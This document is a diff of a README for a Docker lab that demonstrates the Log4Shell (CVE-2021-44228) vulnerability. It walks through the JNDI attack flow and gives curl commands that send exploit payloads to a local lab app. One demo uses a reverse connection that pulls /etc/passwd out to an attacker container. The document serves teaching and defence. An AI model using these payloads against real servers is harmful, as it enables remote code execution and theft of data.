@@ -1,79 +1,56 @@
-# How the Log4Shell Attack Works
+# Log4Shell (CVE-2021-44228) — Lab Demo
 
 ## Overview
 
-Log4Shell (CVE-2021-44228) is a critical vulnerability in Log4j, a popular Java logging library. It allows attackers to execute malicious code on servers just by sending a specially crafted text string.
+Log4Shell is a critical vulnerability in Log4j, a widely used Java logging library. It allows unauthenticated remote code execution by sending a specially crafted string in any field that the application logs.
 
 ---
 
-## Step-by-Step Attack Flow
+## Attack Flow
 
-### **Attacker Sends Malicious Input**
+### 1. Attacker Sends Malicious Input
 
-The attacker enters a special string in any field the application logs (username, search query, user-agent, etc.):
+The attacker submits a JNDI lookup string in any logged field (username, search query, User-Agent header, etc.):
 
 ```
 ${jndi:ldap://attacker-server:1389/Exploit}
 ```
 
-**What this means:**
-- `${}` - "Hey Log4j, do something special with this"
-- `jndi:` - "Use JNDI to look something up"
-- `ldap://attacker-server:1389/Exploit` - "Connect to this address and ask for 'Exploit'"
+### 2. Application Logs the Input
 
-### **Application Logs the Input**
-
-The vulnerable application logs this input:
+The vulnerable application passes the string to Log4j:
 
 ```java
-logger.info("User logged in: " + username);
+logger.info("Login attempt for user: " + username);
 ```
 
-Normally, this just saves text to a log file. But Log4j sees the `${}` pattern and thinks: "This is a special command!"
+Log4j recognizes the `${}` pattern and interprets it as a lookup expression rather than plain text.
 
-### **Log4j Processes the Command**
+### 3. Log4j Performs the JNDI Lookup
 
-Log4j sees `${jndi:ldap://...}` and automatically:
-1. Makes a connection to the attacker's LDAP server
-2. Asks: "What is 'Exploit'?"
+Log4j automatically opens a connection to the attacker's LDAP server and requests the named object (`Exploit`). This is the root of the vulnerability: Log4j should never resolve external references embedded in user input.
 
-**This is the vulnerability** - Log4j shouldn't automatically connect to external servers just because someone typed a special string!
+### 4. LDAP Server Returns a Remote Reference
 
-### **Attacker's Server Responds**
-
-The attacker's LDAP server responds:
+The attacker's LDAP server responds with a reference pointing to a remote Java class:
 
 ```
-"Go download this Java class from http://attacker-server:8888/Exploit.class"
+http://attacker-server:8888/Exploit.class
 ```
 
-### **Victim Downloads Malicious Code**
+### 5. Victim Downloads and Executes Malicious Code
 
-The victim's server:
-1. Connects to `http://attacker-server:8888/Exploit.class`
-2. Downloads the malicious Java class
-3. Loads it into memory
-
-### **Malicious Code Executes**
-
-The `Exploit.class` file contains code that runs automatically when loaded:
+The victim's JVM fetches the class file and loads it. Any code in the `static` initializer block runs immediately upon loading:
 
 ```java
 static {
-    // This code runs immediately!
     Runtime.getRuntime().exec("malicious command");
 }
 ```
 
-**The attacker now has control!** They can:
-- Create backdoors
-- Steal data
-- Install ransomware
-- Pivot to other systems
-
 ---
 
-## Visual Diagram
+## Attack Diagram
 
 ```
 ┌─────────────┐         ┌──────────────────┐         ┌─────────────────┐
@@ -109,38 +86,62 @@ static {
 
 ---
 
-## Why Is This So Dangerous?
+## Why This Vulnerability Is Severe
 
-1. **No authentication required** - Just send a string
-2. **Works on any input field** - Username, password, search, user-agent, etc.
-3. **Automatic execution** - No user interaction needed
-4. **Widespread usage** - Log4j is used in thousands of applications
-5. **Remote Code Execution (RCE)** - Complete system takeover
+- No authentication is required — the payload is a plain text string.
+- Any logged field is a potential attack vector: usernames, passwords, HTTP headers, form fields.
+- Execution is automatic — no user interaction on the victim side.
+- Log4j was present in thousands of applications and frameworks at the time of disclosure.
+- The impact is full remote code execution with the privileges of the running process.
 
 ---
 
-## Testing the Attack in This Lab
+## Lab Instructions
 
 ### Start the Lab
+
 ```bash
 docker-compose up --build
 ```
 
-### Send the Exploit
+### Demo 1 — Remote Code Execution (file creation)
+
+Send the exploit payload:
+
 ```bash
 curl -X POST http://localhost:8080/login \
   -d "username=\${jndi:ldap://ldap-server-exploit:1389/Exploit}&password=test"
 ```
 
-### Verify the Attack Worked
+Verify execution on the victim container:
+
 ```bash
 docker exec web_ssrf-vulnerable-app-1 ls -la /tmp/pwned
 ```
 
-If you see the file, **the attack succeeded!** The malicious code executed and created a file.
+If the file exists, the malicious class was loaded and executed successfully.
 
-## Additional Resources
+### Demo 2 — Data Exfiltration via Reverse Connection
 
-- [NIST CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)
+Send the reverse shell payload:
+
+```bash
+curl -X POST http://localhost:8080/login \
+  -d "username=\${jndi:ldap://ldap-server-revshell:1390/ReverseShell}&password=test"
+```
+
+Verify that the attacker received the exfiltrated data:
+
+```bash
+docker exec <attacker-container-name> cat /tmp/received.txt
+```
+
+The file will contain the contents of `/etc/passwd` from the victim container, transmitted over the reverse connection.
+
+---
+
+## References
+
+- [NIST NVD — CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)
 - [Apache Log4j Security Vulnerabilities](https://logging.apache.org/log4j/2.x/security.html)
 - [CISA Log4Shell Guidance](https://www.cisa.gov/log4j-vulnerability-guidance)
